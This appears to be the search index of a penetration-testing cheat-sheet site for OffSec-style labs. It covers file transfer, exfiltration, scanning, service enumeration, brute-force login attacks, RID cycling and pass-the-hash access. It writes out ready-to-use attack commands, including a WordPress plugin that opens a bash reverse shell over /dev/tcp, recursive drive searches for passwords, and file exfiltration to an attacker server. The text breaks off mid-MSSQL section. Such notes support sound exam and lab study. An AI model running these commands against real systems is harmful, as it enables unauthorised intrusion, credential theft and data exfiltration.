{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83e\udda9 Home","text":""},{"location":"#quick-links","title":"Quick Links","text":"<p>\ud83d\udcdc Writeups \ud83d\udd38 Hacktricks \ud83d\udd38 PayloadsAllTheThings \ud83d\udd38 GTFOBins \ud83d\udd38 RevShells</p>"},{"location":"#connecting-to-rdp","title":"Connecting to RDP","text":"<pre><code># add resolution support\nxfreerdp3 /u:user /p:pass /v:&lt;ip&gt; /dynamic-resolution\n# add clipboard support\nxfreerdp3 /u:user /p:pass /v:&lt;ip&gt; +clipboard\n# add a share to easily transfer files\nxfreerdp3 /u:user /p:pass /v:&lt;ip&gt; /drive:&lt;name&gt;,&lt;path&gt;\n</code></pre>"},{"location":"#file-transfers","title":"File Transfers","text":"<p>Tip</p> <p>Beware of reflected ports!</p>"},{"location":"#http-server","title":"HTTP Server","text":"<pre><code># simple python server\npython -m http.server &lt;port&gt;\n# raven upload service\nraven 0.0.0.0 443\n\n# WebDAV server\nwsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .\n\n# Apache (copy files to /var/www/html)\nsudo systemctl start apache2\n</code></pre>"},{"location":"#smb-server","title":"SMB Server","text":"<pre><code>impacket-smbserver -smb2support share $(pwd) \n# Windows 10+ compatibility (with authentication)\nimpacket-smbserver -smb2support -user test -password test share $(pwd) \n</code></pre>"},{"location":"#netcat","title":"Netcat","text":"<pre><code># start a listener (nc|nc.exe)\nnc -lvnp &lt;port&gt; &gt; received_file\n\n# send the file\nnc &lt;ip&gt; &lt;port&gt; &lt; &lt;file_path&gt;\n</code></pre>"},{"location":"#downloading-files","title":"Downloading files","text":"WindowsLinux <pre><code># PowerShell\niwr -uri &lt;uri&gt; -outfile &lt;filename&gt;\n\n# CMD\ncertutil -urlcache -split -f &lt;uri&gt; &lt;dest&gt;\n\n# copy from SMB share\ncopy \\\\&lt;ip&gt;\\share\\&lt;file&gt;\n\n# mount share before copy (Win 10+ without authentication)\nnet use Z: \\\\&lt;ip&gt;\\share\n# mount share before copy (Win 10+ with authentication)\nnet use Z: \\\\&lt;ip&gt;\\share /u:user 'pass'\n</code></pre> <pre><code># wget and curl\nwget http://&lt;ip&gt;:&lt;port&gt;/&lt;file&gt;\ncurl -O http://&lt;ip&gt;:&lt;port&gt;/&lt;file&gt;\n</code></pre>"},{"location":"#exfiltrating-files-from-windows","title":"Exfiltrating files from Windows","text":"<pre><code># send file to Python upload-enabled server\nInvoke-WebRequest -Uri http://&lt;linux-ip&gt;:&lt;port&gt;/upload -Method Post -InFile C:\\path\\to\\file\ncurl -F \"file=@C:\\path\\to\\file.txt\" http://&lt;linux-ip&gt;:&lt;port&gt; -u user:pass\n\n# copy to SMB share\ncopy C:\\path\\to\\file \\\\&lt;ip&gt;\\share\n\n# mount share before copy (Win 10+ without authentication)\nnet use Z: \\\\&lt;ip&gt;\\share\n# mount share before copy (Win 10+ with authentication)\nnet use Z: \\\\&lt;ip&gt;\\share /u:user 'pass'\n</code></pre>"},{"location":"#ssh","title":"SSH","text":"<pre><code># create keys\nssh-keygen -t rsa -b 4096\n\n# transfer data to\nscp &lt;file&gt; &lt;user&gt;@&lt;ip&gt;:&lt;path&gt;\n# transfer data from\nscp &lt;user&gt;@&lt;ip&gt;:&lt;path&gt; &lt;file&gt;\n# use legacy SCP protocol instead of SFTP\nscp -O &lt;file&gt; &lt;user&gt;@&lt;ip&gt;:&lt;path&gt;\n</code></pre>"},{"location":"#misc","title":"Misc","text":"<pre><code># reduce binary size (useful for binaries that are going to be transferred)\nupx &lt;bin_path&gt;\n\n# find printable strings in a file\nstrings\n\n# extract files from a binary\nbinwalk &lt;bin_path&gt;\nbinwalk -e &lt;bin_path&gt;\n\n\n# display dynamic library calls of a process, perfect for binary hijacking\nltrace\n</code></pre>"},{"location":"#os-commands","title":"OS Commands","text":""},{"location":"#system-information","title":"System Information","text":"LinuxWindows <pre><code># kernel info\nuname -a\n# distro info\nlsb_release -a\n</code></pre> <pre><code># system info\nsysteminfo\nGet-ComputerInfo\n# OS details\nwmic os get version\nGet-WmiObject Win32_OperatingSystem\n# show drives\nGet-PSDrive\n# show tasks\nschtasks\nGet-ScheduledTask\n# recent system events\nGet-EventLog -LogName System -Newest 10\n# path permissions\nicacls \"&lt;path&gt;\"\nGet-ACL \"&lt;path&gt;\"\n</code></pre>"},{"location":"#user-management","title":"User Management","text":"LinuxWindows <pre><code># show user info\nid &lt;username&gt;\nwhoami\ngroups &lt;username&gt;\n# switch to user\nsu - &lt;username&gt;\nsudo su - &lt;username&gt;\n# switch to root\nsu -\nsudo su -\n# check user sudo permissions\nsudo -l\n\n# create/delete/change user password\nuseradd -m username\nuseradd -u &lt;UID&gt; -g &lt;group&gt; &lt;uname&gt;\nuserdel -r username\npasswd username\n# add to group\nusermod -aG sudo username\n\n# show who is currently logged in\nwho | w\n# show last logins\nlast\n</code></pre> <pre><code># show current user\nwhoami /all\n# list all users\nnet user\nGet-LocalUser\n# show user details\nnet user username\n# create/delete/change user password\nnet user username password /add\nNew-LocalUser -Name \"username\" -Password (ConvertTo-SecureString \"password\" -AsPlainText -Force)\nnet user username /delete\nnet user username newpassword\n# list all groups\nnet localgroup\nGet-LocalGroup\n# show members\nnet localgroup groupname\nGet-LocalGroupMember \"Administrators\"\n# add/delete user to group\nnet localgroup groupname username /add\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"username\"\nnet localgroup groupname username /delete\nnet localgroup Administrators username /add\n\n# run command as a different user\nrunas /user:domain\\username cmd\n</code></pre>"},{"location":"#file-operations","title":"File Operations","text":"LinuxWindows <pre><code>find / -name filename 2&gt;/dev/null\n# find text in files\ngrep -r \"text\" /path 2&gt;/dev/null\n\n# compress/extract files\ntar -czvf archive.tar.gz /path\ntar -xzvf archive.tar.gz\n\n# find a program\nwhich &lt;program&gt;\nwhereis &lt;program&gt;\nlocate &lt;program&gt;\n</code></pre> <pre><code>dir /s filename 2&gt;nul\nGet-ChildItem -Recurse -Filter *.txt -ErrorAction SilentlyContinue\n# find text in files\nfindstr /s \"text\" * 2&gt;nul\nSelect-String -Path *.txt -Pattern \"text\" -ErrorAction SilentlyContinue\n# search for a string in all files\nGet-ChildItem -Path C:\\ -Recurse -File -Force -ErrorAction SilentlyContinue | Select-String -Pattern \"password\" -ErrorAction SilentlyContinue\n# search for a string in specific files\nGet-ChildItem -Path C:\\ -Recurse -File -Force -Include \"*.txt\",\"*.config\",\"*.json\" -ErrorAction SilentlyContinue | Select-String -Pattern \"password\" -ErrorAction SilentlyContinue\n\n# find a program\nwhere /R &lt;path&gt; &lt;program.exe&gt;\nGet-ChildItem -Path C:\\ -Filter &lt;program.exe&gt; -Recurse -ErrorAction SilentlyContinue\n\n# copy directories recursively\nxcopy /s /e source destination /Y 2&gt;nul\nCopy-Item -Recurse source destination -Force\n# move\nmove source destination\n# delete\ndel filename /Q\nRemove-Item -Recurse -Force path\n</code></pre>"},{"location":"#process-management","title":"Process Management","text":"LinuxWindows <pre><code>ps aux\nps auxww\nkill &lt;pid&gt;\n# force\nkill -9 &lt;pid&gt;\nkillall &lt;process_name&gt;\n# find process PID by name\npgrep process_name\n</code></pre> <pre><code>tasklist\nwmic process list full\n# find specific\ntasklist | findstr &lt;program.exe&gt;\n\n# force kill process by name\ntaskkill /F /IM &lt;program.exe&gt;\n# by ID\ntaskkill /PID &lt;pid_number&gt; /F\n\nGet-Process\n# force kill process by ID\nStop-Process -Id PID -Force\nStop-Process -Name \"process\" -Force\n</code></pre>"},{"location":"#networking","title":"Networking","text":"LinuxWindows <pre><code># show interfaces\nip a\nifconfig\n# list listening connections\nss -ntplu\nnetstat -ntplu\n# show processes listening on a port\nlsof :i&lt;port&gt;\n# test connectivity\nping host\n# trace path\ntraceroute host\n# DNS lookup\ndig domain\nnslookup domain\n# kill connection\nfuser -k &lt;port&gt;/tcp\nfuser -k &lt;port&gt;/udp\n# routing table\nip route show\n# log incoming traffic on a specific port\nsudo tcpdump -nvvvXi tun0 tcp port 8080\n</code></pre> <pre><code># show network config\nipconfig /all\n# connections and listening ports\nnetstat -ano\n# show ip addresses\nGet-NetIPAddress\n# show tcp connections\nGet-NetTCPConnection\n# dns lookup\nnslookup domain\nResolve-DnsName domain\n# trace route\ntracert host\n# test connectivity\nTest-NetConnection host -Port port\n# routing table\nroute print\n</code></pre>"},{"location":"#service-management","title":"Service Management","text":"LinuxWindows <pre><code># systemd distros\nsystemctl status service_name\nsystemctl start|stop|restart service_name\n# enable service to start at boot\nsystemctl enable|disable service_name\n\n# no systemd\nservice service_name status\nservice service_name start|stop|restart\n\n# other\nls /etc/init.d/\n/etc/init.d/service_name start|stop|restart\n</code></pre> <pre><code>sc query service_name\nGet-Service service_name\n\nsc start|stop service_name\nnet start|stop service_name\nStart-Service service_name\nStop-Service service_name\nRestart-Service service_name\n\n# set service to start automatically\nsc config service_name start=auto\nSet-Service service_name -StartupType Automatic\nSet-Service service_name -StartupType Disabled\n# disable service\nsc config service_name start=disabled\n\n# list all running services\nGet-Service | Where-Object {$_.Status -eq \"Running\"}\n</code></pre>"},{"location":"#system-control","title":"System Control","text":"LinuxWindows <pre><code>sudo reboot\nsudo shutdown -r now\n# shutdown\nsudo shutdown -h now\n# traditional restart\nsudo init 6\n</code></pre> <pre><code># restart and shutdown\nshutdown /r /t 0\nshutdown /s /t 0\n\nRestart-Computer -Force\nStop-Computer\n</code></pre>"},{"location":"#error-suppression","title":"Error Suppression","text":"LinuxWindows <ul> <li>Append <code>2&gt;/dev/null</code> to suppress error messages only.</li> <li>Append <code>&amp;&gt;/dev/null</code> to suppress both standard output and errors.</li> </ul> <ul> <li>CMD: Append <code>2&gt;nul</code> to suppress error messages.</li> <li>PowerShell: Add the <code>-ErrorAction SilentlyContinue</code> parameter to cmdlets.</li> </ul>"},{"location":"#git","title":"Git","text":"<p>git-dumper</p> <pre><code># dump git repo from URL\ngit-dumper &lt;url&gt;/.git ./website\n\n# show commits on a branch\ngit log\n# show commit details and changes\ngit show &lt;commit&gt;\n</code></pre>"},{"location":"#aws","title":"AWS","text":"<p>Out of Scope</p> <p>Set up credentials if you find access keys.</p> <pre><code>aws configure\n</code></pre>"},{"location":"#s3","title":"S3","text":"<pre><code># list public buckets without credentials\naws s3 ls s3://&lt;bucket&gt;/ --endpoint-url &lt;url&gt; --no-sign-request\n\n# download a bucket\naws s3 cp s3://&lt;bucket&gt; ./\n\n# check bucket policy\naws s3api get-bucket-policy --bucket &lt;bucket&gt; --endpoint-url &lt;url&gt; --no-sign-request\n\n# upload a file to a bucket\naws s3 cp &lt;file&gt; s3://&lt;bucket&gt;/ --endpoint-url &lt;url&gt; --no-sign-request\n</code></pre>"},{"location":"#vpn","title":"VPN","text":"<p>Danger</p> <p>OffSec machines and VPN are sometimes unstable.</p> <p>Reduce MTU if reverse shells are not connecting back.</p> <pre><code>ifconfig tun0 mtu 1200\n</code></pre>"},{"location":"10_info_gathering/","title":"\ud83d\udd0d Information Gathering","text":""},{"location":"10_info_gathering/#passive","title":"Passive","text":"<ul> <li>Whois: <code>whois &lt;domain/ip&gt; -h &lt;whois_server&gt;</code></li> <li>Google dorks: <code>site:</code>, <code>filetype:</code>, <code>intitle:</code>, DorkSearch or GHDB</li> <li>Netcraft: DNS analyzer</li> <li>Open-Source code:</li> <li><code>path:&lt;word&gt;</code> inside a GitHub repo to search files with that word.</li> <li>Tools: Gitrob, Gitleaks</li> <li>Shodan: <code>hostname:&lt;name&gt;</code></li> <li>Security headers: Security Headers, SSL Server Test</li> </ul>"},{"location":"10_info_gathering/#active","title":"Active","text":""},{"location":"10_info_gathering/#host-discovery","title":"Host Discovery","text":"LinuxWindows <pre><code>nmap -v -sn x.x.x.1-253\nnmap -sn x.x.x.0/24\n\nfor i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done\nfor ip in 192.168.1.{1..254}; do ping -c1 -W1 $ip &amp;&gt;/dev/null &amp;&amp; echo \"$ip is up\"; done\nfping -a -g 192.168.1.1 192.168.1.254 2&gt;/dev/null\n</code></pre> <pre><code># cmd\nfor /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find \"Reply\"\n# ps\n1..254 | % {\"172.16.6.$($_): $(Test-Connection -Count 1 -ComputerName 172.16.6.$($_) -Quiet)\"}\n</code></pre>"},{"location":"10_info_gathering/#port-scanning","title":"Port Scanning","text":"<pre><code># netcat scan\nnc -nvv -w 1 -z &lt;ip&gt; 3388-3390 # tcp\nnc -nv -u -z -w 1 &lt;ip&gt; 120-123 # udp\n\n# nmap\nnmap &lt;ip&gt; # -sS SYN by default\nnmap -sT &lt;ip&gt; # TCP scan\nsudo nmap -sU &lt;ip&gt; # UDP scan, sudo needed to access raw sockets\nnmap -sT -A --top-ports=20 x.x.x.1-253 -oN sweep.txt\nnmap -A -Pn -T4 --min-rate 5000 -p- &lt;ip&gt; # Full scan skipping host discovery\nnmap -sC -sV -Pn -n -T4 --min-rate 5000 -p- &lt;ip&gt; -oN nmap # Scan with version discovery and scripts without name resolution\n\n# tcp scan with proxychains\nsudo proxychains -q nmap -sT -Pn --top-ports 200 &lt;ip&gt;\n\n# Powershell\nTest-NetConnection -Port &lt;port&gt; &lt;ip&gt; \n\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"IP\", $_)) \"TCP port $_ is open\"} 2&gt;$null # Powershell one-liner to scan the first 1024 ports\n</code></pre>"},{"location":"10_info_gathering/#nse","title":"NSE","text":"<pre><code>sudo nmap --script-updatedb\nlocate .nse | grep &lt;name&gt;\nlocate .nse | xargs grep categories\nnmap --script-help &lt;name&gt;\nnmap --script &lt;name&gt; -p &lt;port&gt; &lt;ip&gt;\n# example\nnmap -sV -p 445 --script smb-ls &lt;ip&gt; \n</code></pre>"},{"location":"10_info_gathering/#unknown-service","title":"Unknown Service","text":"<pre><code># when a port is unrecognized, try\ntelnet &lt;ip&gt; &lt;port&gt;\nnc -v &lt;ip&gt; &lt;port&gt;\ncurl -v http://&lt;target&gt;:&lt;port&gt;\n\n# the machine name can provide a clue about the unknown service; try searching for the port and the name \n</code></pre>"},{"location":"10_info_gathering/#packet-capture","title":"Packet Capture","text":"<pre><code># capture packets going to port 80\ntshark -i tun0 -Y \"ip.addr == &lt;local_ip&gt; &amp;&amp; tcp.dstport == 80\" 2&gt;/dev/null\n</code></pre>"},{"location":"10_info_gathering/#ftp-21","title":"FTP - 21","text":"<p>Tip</p> <p>\ud83c\udf6a Try anonymous:anonymous</p> <pre><code>ftp &lt;ip&gt;\n# once inside, upload/download files with\nput &lt;file&gt;\nget &lt;file&gt;\n# get all\nwget -m ftp://anonymous:anonymous@&lt;ip&gt;\n\n# bruteforce\nhydra ftp://&lt;ip&gt; -l &lt;user&gt; -P &lt;wordlist&gt;\npatator ftp_login host=&lt;ip&gt; user=FILE0 password=FILE1 0=&lt;userlist&gt; 1=&lt;wordlist&gt; -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500\n\n# nse\nlocate .nse | grep ftp\nnmap -p 21 --script=&lt;name&gt; &lt;ip&gt;\n</code></pre>"},{"location":"10_info_gathering/#ssh-22","title":"SSH - 22","text":"<pre><code>ssh username@&lt;ip&gt;\n\n# using private key\nssh username@&lt;ip&gt; -i &lt;key&gt;\n\n# bruteforce\nhydra ssh://&lt;ip&gt; -l &lt;user&gt; -P &lt;wordlist&gt; -s &lt;port&gt;\npatator ssh_login host=&lt;ip&gt; user=&lt;user&gt; password=FILE0 0=&lt;wordlist&gt; --max-retries 0 --timeout 10 -x ignore:time=0-3\n</code></pre>"},{"location":"10_info_gathering/#smtp-25","title":"SMTP - 25","text":"<pre><code># banner grabbing\ntelnet &lt;ip&gt; 25\n\nnc -nv &lt;ip&gt; 25\nVRFY &lt;user&gt;\nRPC TO:&lt;user&gt;\nEXPN &lt;user&gt;\n\n# check if user exists\nsmtp-user-enum -M &lt;MODE&gt; -D &lt;domain&gt; -u &lt;user&gt; -t &lt;IP&gt;\nnmap --script smtp-enum-users &lt;ip&gt;\n\n# Windows\nTest-NetConnection -Port 25 &lt;IP&gt; # Non-interactive\ndism /online /Enable-Feature /FeatureName:TelnetClient # Needs privs\ntelnet &lt;IP&gt; 25 # Needs telnet.exe binary\n</code></pre>"},{"location":"10_info_gathering/#dns-53","title":"DNS - 53","text":"<p>Common type of DNS records:</p> <ul> <li>NS (Nameserver): Points to the authoritative DNS servers for a domain.</li> <li>A (Address): Maps a hostname (e.g., <code>www.example.com</code>) to an IPv4 address.</li> <li>AAAA (Quad A): Maps a hostname to an IPv6 address.</li> <li>MX (Mail Exchange): Specifies mail servers for email handling. Multiple records allowed.</li> <li>PTR (Pointer): Used for reverse DNS lookups; maps IP addresses to hostnames.</li> <li>CNAME (Canonical Name): Creates an alias for another hostname.</li> <li>TXT (Text): Stores arbitrary text data, often for verification (e.g., domain ownership).</li> </ul> <p>Tip</p> <p>\ud83d\udcdc Recommended wordlists: <code>/usr/share/seclists/Discovery/DNS</code></p> <pre><code>host megacorpone.com\nhost -t mx megacorpone.com\nhost -t txt megacorpone.com\nhost sub.megacorpone.com\n\n# subdomain bruteforce\nfor word in $(cat list.txt); do host $word.megacorpone.com; done\n# reverse IP bruteforce\nfor word in $(seq 200 254); do host 192.168.50.$word; done | grep -v \"not found\"\n\n# dnsrecon\ndnsrecon -d megacorpone.com -t std\ndnsrecon -d megacorpone.com -D list.txt -t brt # bruteforce\n\n# dnsenum \ndnsenum megacorpone.com\n\n# nslookup (Linux/Windows)\nnslookup megacorpone.com\n# query a specific server\nnslookup -type=TXT info.megacorptwo.com &lt;ip&gt;\n\n# Zone transfer\ndig @&lt;ip&gt; &lt;domain&gt; axfr \n</code></pre>"},{"location":"10_info_gathering/#http-80-443-tls","title":"HTTP - 80, 443 (TLS)","text":"<ul> <li>Technology stack identification with Wappalyzer , Nmap or whatweb.</li> <li>Check robots, sitemap, 404 and SSL/TLS scan.</li> <li>Directory brute forcing.</li> <li>Inspect source code.</li> <li>If the web uses a domain, add it to hosts file.</li> <li>Check if the host has services like FTP/SMB with write perms and check if a file can be accessed from the web.</li> </ul> <p>Tip</p> <p>\ud83d\udcdc Recommended wordlists: <code>/usr/share/seclists/Discovery/Web-Content</code></p> <p>git-dumper</p> <pre><code># analyze website\nwhatweb -a 1 &lt;url&gt;\nnikto -h &lt;url&gt;\nsslscan &lt;host&gt;:&lt;port&gt;\n\n# brute force directories\ngobuster dir -u &lt;url&gt; -w &lt;wordlist&gt; -t 60 -x pdf,txt,php,config,git\nwfuzz -w &lt;wordlist&gt; &lt;URL&gt;/FUZZ\nferoxbuster -u &lt;url&gt; -w &lt;wordlist&gt; -t 60 -x pdf -x txt -x php -x config -x git\n\n# brute force login page with hydra and patator\nhydra -L &lt;userlist&gt; -P &lt;wordlist&gt; &lt;target&gt; http-{get|post}-form \"/login:username=^USER^&amp;password=^PASS^:F=Login failed. Invalid\"\npatator http_fuzz url=&lt;url&gt; method=POST body='user=admin&amp;pass=COMBO00&amp;sublogin=1' 0=&lt;wordlist&gt; accept_cookie=1 follow=1 max_follow=2 -x ignore:fgrep='Invalid password' -x ignore:clen=5881\n\n# if .git found, dump it\ngit-dumper &lt;url&gt;/.git ./website\n</code></pre>"},{"location":"10_info_gathering/#subdomain-discovery","title":"Subdomain Discovery","text":"<p>Tip</p> <p>\ud83d\udcdc Recommended wordlists: <code>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></p> <pre><code>wfuzz -c --hh=230 -t 200 -w &lt;wordlist&gt; -H \"Host: FUZZ.domain.com\" http://domain.com\n</code></pre>"},{"location":"10_info_gathering/#wordpress","title":"Wordpress","text":"<p>Info</p> <p>\ud83d\udc08\u200d\u2b1b Hashcat mode -&gt; 400</p> <pre><code>wpscan --url &lt;url&gt;\n# enumerate vulnerable plugins, users, vulnerable themes and timthumbs and save it to file\nwpscan --url &lt;url&gt; -e vp,u,vt,tt -o result.log\n# scan popular plugins aggresively and get vulns\nwpscan --url &lt;url&gt; -e p --api-token &lt;API_TOKEN&gt; --plugins-detection aggressive\n# brute force found users, use -U admin for a single user\nwpscan --rua -e u --url &lt;url&gt; -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt \n</code></pre> <p>If admin permissions are granted, upload a plugin with a reverse shell. If unable to upload a plugin, edit the theme with a PHP reverse shell.</p> <pre><code>mkdir rs\ncat &gt; rs/rs.php\n&lt;?php\n/*\nPlugin Name: Reverse Shell\nPlugin URI: http://your-site.com/\nDescription: A simple plugin to establish a reverse shell using /bin/sh.\nVersion: 1.0\nAuthor: Pentester\n*/\n\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'\") ?&gt;\n\nzip -r rs.zip rs\n</code></pre>"},{"location":"10_info_gathering/#pop3-110-995-tls","title":"POP3 - 110, 995 (TLS)","text":"<pre><code>telnet &lt;ip&gt; &lt;port&gt;\n\n# commands\nUSER uid           Log in as \"uid\"\nPASS password      Substitue \"password\" for your actual password\nSTAT               List number of messages, total mailbox size\nLIST               List messages and sizes\nRETR n             Show message n\nDELE n             Mark message n for deletion\nRSET               Undo any changes\nQUIT               Logout (expunges messages if no RSET)\nTOP msg n          Show first n lines of message number msg\nCAPA               Get capabilities\n</code></pre>"},{"location":"10_info_gathering/#nfs-111-2049","title":"NFS - 111, 2049","text":"<pre><code># list mounts\nshowmount -e &lt;ip&gt;\n\n# mount a share\nmkdir nfsfolder\nsudo mount -t nfs &lt;ip&gt;:/export/data nfsfolder\n</code></pre>"},{"location":"10_info_gathering/#smb-139-445","title":"SMB - 139, 445","text":"<pre><code># details about devices using netbios\nsudo nbtscan -r &lt;ip&gt;/&lt;range&gt;\n\n# nse\nlocate .nse | grep smb\nnmap --script=&lt;name&gt; &lt;ip&gt;\n\n# enum shares from windows\nnet view \\\\&lt;host/IP&gt; /all\n\n# smbclient\nsmbclient -U '&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;' -L //&lt;ip&gt;\nsmbclient -U '' -L //&lt;ip&gt; # list shares anonymously\nsmbclient -U '' -N -L //&lt;ip&gt; # list by null session\nsmbclient -U '' //&lt;ip&gt;/share # access share\nsmbclient -U '&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;' -L //&lt;ip&gt;\n\n# once inside, upload or download files\nget &lt;file&gt;\nput &lt;file&gt;\n# or get entire folder\nprompt OFF\nrecurse ON\nmget *\n# one-liner\nsmbclient -U 'guest' //&lt;ip&gt;/&lt;share&gt; -c 'prompt OFF;recurse ON; mget *'\n\n# smbmap (shows permissions)\nsmbmap -H &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt;\nsmbmap -H &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt;\nsmbmap -H &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -r &lt;share&gt;\n\n# nxc\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt;\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; --shares\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; --users\nnxc smb &lt;ip&gt; -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; --all\n# enum users by rid\nnxc smb &lt;ip&gt; -u 'guest' -p '' --rid-brute\n\n# auto\nenum4linux -a &lt;ip&gt;\n</code></pre>"},{"location":"10_info_gathering/#rpc-139-445","title":"RPC - 139, 445","text":"<pre><code>rpcclient -U \"\" -N &lt;IP&gt; # null session\nrpcclient -U \"\" &lt;IP&gt; # anon session\nrpcclient -U \"guest&amp;\" &lt;IP&gt; # public session\nrpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash\nrpcclient -U \"username%passwd\" &lt;IP&gt;\n\n# once inside\nenumdomusers\nenumdomgroups\nenumprivs\nqueryuser &lt;user&gt;\nquerygroup &lt;group&gt;\nquerydispinfo\n</code></pre>"},{"location":"10_info_gathering/#rpc-rid-cycling-attack","title":"RPC RID Cycling Attack","text":"<p>If we can connect but have no permissions to enum, maybe we can enum by RID Cycling.</p> <pre><code># first, enum administrator\n&gt; rpcclient -U \"guest%\" &lt;ip&gt; -c 'lookupnames administrator'\nadministrator S-1-5-21......-500\n# the rid is 500, so we can lookupsids increasing the rid\n&gt; rpcclient -U \"guest%\" &lt;ip&gt; -c 'lookupsids S-1-5-21......-501'\n&gt; rpcclient -U \"guest%\" &lt;ip&gt; -c 'lookupsids S-1-5-21......-502'\n# this can be automated \nseq 400 2000 | xargs -P 50 -I {} rpcclient -U \"guest%\" &lt;ip&gt; -c 'lookupsids S-1-5-21......-{}'\n</code></pre>"},{"location":"10_info_gathering/#imap-143-993-tls","title":"IMAP - 143, 993 (TLS)","text":"<p>Commands examples</p> <pre><code># brute force\nhydra imap://&lt;ip&gt; -L &lt;userlist&gt; -P &lt;wordlist&gt;\nnmap -sV --script imap-brute -p &lt;port&gt; &lt;ip&gt;\n\n# connect to server\ntelnet &lt;ip&gt; &lt;port&gt;\n</code></pre>"},{"location":"10_info_gathering/#snmp-161udp","title":"SNMP - 161/udp","text":"<p>https://github.com/SECFORCE/SNMP-Brute</p> <pre><code># nmap UDP scan\nsudo nmap -sU --open -p 161 &lt;IP&gt;\n\nsnmpwalk -c public -v1 -t 10 &lt;IP&gt; # Entire MIB tree\nsnmpwalk -c public -v1 &lt;IP&gt; &lt;MIB value&gt;\n\nsnmpcheck -t &lt;IP&gt; -c public\n\n# Windows MIB values\n1.3.6.1.2.1.25.1.6.0   - System Processes\n1.3.6.1.2.1.25.4.2.1.2 - Running Programs\n1.3.6.1.2.1.25.4.2.1.4 - Processes Path\n1.3.6.1.2.1.25.2.3.1.4 - Storage Units\n1.3.6.1.2.1.25.6.3.1.2 - Software Name\n1.3.6.1.4.1.77.1.2.25  - User Accounts\n1.3.6.1.2.1.6.13.1.3   - TCP Local Ports\n\n# enumerate even more\napt-get install snmp-mibs-downloader\nsudo download-mibs\nsnmpwalk -c public -v1 -t 10 &lt;IP&gt; NET-SNMP-EXTEND-MIB::nsExtendOutputFull\n\n# brute force community word with https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py\npython snmpbrute.py -t &lt;ip&gt; -f /usr/share/seclists/Discovery/SNMP/snmp.txt\nhydra snmp://192.168.188.149 -P /usr/share/seclists/Discovery/SNMP/snmp.txt\n</code></pre>"},{"location":"10_info_gathering/#ldap-389-636-tsl","title":"LDAP - 389, 636 (TSL)","text":"<p>go-windapsearch</p> <pre><code># get users info\nldapsearch -x -H ldap://&lt;ip&gt;:&lt;port&gt;\n\n# anonymous session\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\\\\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=user)\"\n\n# find all users\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=user)\"\n# find a specific user by username\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(sAMAccountName=&lt;name&gt;)\"\n# find all groups\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=group)\"\n# find groups a specific user belongs to\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(&amp;(objectClass=group)(member=CN=John Doe,CN=Users,DC=&lt;domain&gt;,DC=&lt;tld&gt;))\"\n# find all computer objects\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(objectClass=computer)\"\n# find all domain controllers\nldapsearch -x -H ldap://&lt;ip&gt; -D \"&lt;domain&gt;\\&lt;user&gt;\" -W -b \"DC=&lt;domain&gt;,DC=&lt;tld&gt;\" \"(userAccountControl:1.2.840.113556.1.4.803:=532480)\"\n\n# windapsearch.py\n# get all users\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m users\n# get all domain admin members\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m members -s 'domain admin'\n# get groups\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m groups\n# get computers\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m computers\n# get privileged users\nwindapsearch -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; -m privileged-users\n</code></pre>"},{"location":"10_info_gathering/#mssql-1433","title":"MSSQL - 1433","text":"<p>Tip</p> <p>\ud83c\udf6a Don't forget the <code>-windows-auth</code> param</p> <pre><code># sql auth\nimpacket-mssqlclient &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;\n# NTLM or Kerberos auth\nimpacket-mssqlclient &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; -windows-auth\n\n# commands\n# show all databases\nSELECT name FROM sys.databases;\n# switch database\nUSE &lt;database_name&gt;;\n# show all tables in current database\nSELECT name FROM sys.tables;\n# or for all tables (including system tables):\nSELECT * FROM 